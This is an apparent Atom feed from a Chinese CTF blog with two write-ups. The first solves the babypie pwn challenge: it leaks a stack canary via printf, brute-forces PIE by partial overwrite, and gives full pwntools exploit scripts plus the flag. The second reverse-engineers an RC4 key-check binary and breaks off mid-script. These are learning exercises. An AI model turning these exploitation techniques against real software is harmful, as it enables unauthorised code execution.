<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ss1du0us&#39;s Blog</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://www.4ss1du0us.cn/atom.xml" rel="self"/>
  
  <link href="https://www.4ss1du0us.cn/"/>
  <updated>2023-07-03T13:01:17.642Z</updated>
  <id>https://www.4ss1du0us.cn/</id>
  
  <author>
    <name>4ss1du0us</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【BUUCTF】linkctf_2018.7_babypie1</title>
    <link href="https://www.4ss1du0us.cn/2023/0789729f60.html"/>
    <id>https://www.4ss1du0us.cn/2023/0789729f60.html</id>
    <published>2023-07-02T06:28:10.000Z</published>
    <updated>2023-07-03T13:01:17.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>通过栈溢出覆盖 canary 最后一字节 <code>b&#39;\x00&#39;</code>，再利用 <code>printf()</code> 将 canary 的余下七字节输出，从而绕过 canary 保护</mark></p></li><li><p>利用 <code>partial write</code> 漏洞爆破 PIE 地址随机化</p></li></ul><hr><p><a href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">【BUUCTF】linkctf_2018.7_babypie1</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析文件：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie1.png" alt="BUUCTF-babypie1.png"><br>权限都开了</p></li><li><p>在 IDA 下分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie2.png" alt="BUUCTF-babypie2.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie3.png" alt="BUUCTF-babypie3.png"><br>观察 <code>buf</code> 在栈中的情况：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie4.png" alt="BUUCTF-babypie4.png"><br>在 <code>buf</code> 处存在溢出，不过有 canary 保护</p></li><li><p>查看字符串：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie5.png" alt="BUUCTF-babypie5.png"><br>存在 <code>&quot;/bin/sh&quot;</code><br>发现后门函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie6.png" alt="BUUCTF-babypie6.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie7.png" alt="BUUCTF-babypie7.png"></p></li><li><p>第一个输入 <code>read(0, buf, 0x30uLL)</code> 虽然无法溢出，但是 <code>printf(&quot;Hello %s:\n&quot;, buf)</code> 可以打印出 <code>buf</code> 的内容<br>由于 canary 的最后一字节为 <code>b&#39;\x00&#39;</code>，会截断 <code>printf()</code> 的输出<br>因此可以考虑控制 <code>buf</code> 的长度，将 canary 的最后一字节 <code>b&#39;\x00&#39;</code> 覆盖掉，于是 <code>printf()</code> 就会将 canary 的内容输出出来</p></li><li><p>获得 canary 的值之后就可以通过第二个 <code>read(0, buf, 0x60uLL)</code> 来溢出了<br>但是程序开启了 PIE 地址随机化，因此 <code>0xA42</code> 并不是后门函数的真实地址</p></li><li><p>不过由于 <code>partial write</code>（部分写入）的原理，地址的后三位与真实地址是相同的<br>也就是说真实地址是 <code>0xnA42</code>，<code>n</code> 未知，但 <code>n</code> 取值在 <code>0 ~ 15</code> 之间<br>所以可以进行暴力破解真实地址（或者直接使用 <code>0x0A42</code> 进行碰撞，有概率碰撞正确）</p></li><li><p>另外，由于后门地址和 ret_addr 的地址只有后两位不一样，所以覆盖返回地址的时候直接填上 <code>b&#39;\x42&#39;</code> 也可以，只修改地址的最后两位</p></li></ol><hr><h2 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/linkctf_2018.7_babypie1/babypie"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25143</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your Name:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span>  <span class="token comment"># 0x30 - 0x8 到达 canary 的地址，0x30 - 0x8 + 0x1 为 canary 的最后一字节 b'\x00' 的地址</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment"># 接收 printf 输出的七字节 canary 数据</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> tmp  <span class="token comment"># 加上最后一字节 b'\x00' 补齐 canary</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary："</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span>payload<span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token string">b'\x42'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h2><blockquote><p>flag{06ccfdaa-2392-4671-b0c0-5fb5bdf5c8cd}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie8.png" alt="BUUCTF-babypie8.png"></p><hr><h2 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/linkctf_2018.7_babypie1/babypie"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25143</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your Name:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary："</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token comment"># 爆破后门函数地址</span>address <span class="token operator">=</span> <span class="token string">b'\x42'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    address <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x10</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">0xa</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 构造 b'\xia'，即 address = p64(0xia42)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> address    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 注意不能用 sendline，不能添加换行符</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'whoami'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'wyy'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"地址爆破成功："</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        address <span class="token operator">=</span> address<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">continue</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/BUUCTF-babypie9.png" alt="BUUCTF-babypie9.png"></p>]]></content>
    
    
    <summary type="html">通过栈溢出覆盖 canary 最后一字节 b&#39;\x00&#39; 利用 printf() 将 canary 的余下七字节输出，从而绕过 canary 保护，同时涉及到利用 partial write 进行 PIE 地址随机化的爆破</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【安洵杯 2023】babyThread</title>
    <link href="https://www.4ss1du0us.cn/2023/06ba67331d.html"/>
    <id>https://www.4ss1du0us.cn/2023/06ba67331d.html</id>
    <published>2023-06-18T10:14:24.000Z</published>
    <updated>2023-07-05T12:57:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><hr><p><a href="http://ctf.i-soon.net:8080/account/login?from=/games">（2023年6月10日）【安洵杯 2023】babyThread</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载文件，双击打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread1.png" alt="安洵杯2023-babyThread1.png"><br>在 IDA 分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread2.png" alt="安洵杯2023-babyThread2.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread3.png" alt="安洵杯2023-babyThread3.png"><br>通过 <code>CreateThread()</code> 创建了两个线程<br>跟进 <code>StartAddress</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread4.png" alt="安洵杯2023-babyThread4.png"><br>只有一个复制操作<br>Str &#x3D; “D..^!ARBIh@;K:dAU-K`“<br>跟进 <code>sub_731316()</code>，会执行 <code>sub_731B80()</code> ：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread5.png" alt="安洵杯2023-babyThread5.png"><br>可以看到程序的主要逻辑，用户输入 <code>Str</code>，然后进行 <code>sub_73129E(16, Str, v5, Buf2)</code> 的处理，最后将 <code>Buf2</code> 与 <code>unk_73B018</code> 处的数据比对，如果相同则校验通过<br>查看 <code>unk_73B018</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread6.png" alt="安洵杯2023-babyThread6.png"><br>使用 IDA 将数据导出：<code>unsigned char unk_73B018[32] = &#123;0xDE, 0x1C, 0x22, 0x27, 0x1D, 0xAE, 0xAD, 0x65, 0xAD, 0xEF, 0x6E, 0x41, 0x4C, 0x34, 0x75, 0xF1, 0x16, 0x50, 0x50, 0xD4, 0x48, 0x69, 0x6D, 0x93, 0x36, 0x1C, 0x86, 0x3B, 0xBB, 0xD0, 0x4C, 0x91&#125;</code></p></li><li><p>跟进 <code>sub_73129E(16, Str, v5, Buf2)</code>，会执行 <code>sub_731DA0()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread7.png" alt="安洵杯2023-babyThread7.png"><br>查看 <code>Str</code> 内容：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread9.png" alt="安洵杯2023-babyThread9.png"><br>Str &#x3D; “FD,B0?YORg@:*VTCLnY4”<br>后面那一段代码形似 <code>rc4()</code> 的加密算法，跟进 <code>sub_731127()</code>，会执行 <code>sub_7320E0()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread8.png" alt="安洵杯2023-babyThread8.png"><br>明显是 <code>rc4()</code> 的初始化<br>因此 <code>sub_73129E(16, Str, v5, Buf2)</code> 做的是 <code>rc4()</code> 加密，分析可知 <code>Str</code> 为密钥，<code>Buf2</code> 为密文，<code>unk_73B018</code> 为加密后的 flag<br>结合 <code>sub_731127(v12, a1, v6)</code> 可知，<code>v12</code> 是密钥，<code>Buf2</code> 是密文</p></li><li><p>但是分析发现密钥有很多不同的值，尝试用 “D..^!ARBIh@;K:dAU-K`“ 和 “FD,B0?YORg@:*VTCLnY4” 解密都不正确<br>在字符串中也没有其他形似这样的格式：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread10.png" alt="安洵杯2023-babyThread10.png"><br>可见这个题主要问题在于寻找真正的密钥 <code>Key</code></p></li><li><p>于是想通过动态调试获得密钥 <code>Key</code>，但是发现无法调试（后来发现在 OllyDBG 中是可以的，因为 OllyDBG 具有反反调试的功能）</p></li></ol><blockquote><p>后面在网上才了解到 TLS 回调函数的反调试</p><p>线程局部存储（Thread Local Storage，TLS）是一种线程级别的存储机制，它允许每个线程在运行时都拥有自己的私有变量，<strong>这些变量只能被该线程访问，而不会被其他线程所共享</strong></p></blockquote><hr><h2 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span>  <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的最高一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BYTE2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 取四字节数据的次高一字节  </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的次低一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> key_Len<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//临时向量 k    unsigned char tmp = 0;  </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>          k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> key_Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Len = strlen(key)，密钥的长度  </span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//打乱s表  </span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]  </span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Data_Len<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> Data_Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]  </span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>          t <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>      <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1F0h] [ebp-64h]  </span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+20Ch] [ebp-48h]  </span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+218h] [ebp-3Ch]  </span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+224h] [ebp-30h]  </span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+230h] [ebp-24h]  </span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+23Ch] [ebp-18h] BYREF  </span>      <span class="token comment">// string Destination = "FD,B0?YORg@:*VTCLnY4";</span>    <span class="token comment">// string Destination = "D..^!ARBIh@;K:dAU-K`";</span>    string Destination <span class="token operator">=</span> <span class="token string">"!This_program_cannot"</span><span class="token punctuation">;</span>        v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">85</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7225</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">614125</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52200625</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token operator">&lt;</span> Destination<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">122</span> <span class="token punctuation">)</span>                  v12<span class="token punctuation">[</span>i <span class="token operator">+</span> v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">else</span>            v8 <span class="token operator">+=</span> v7<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>            v12<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8  <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token comment">// 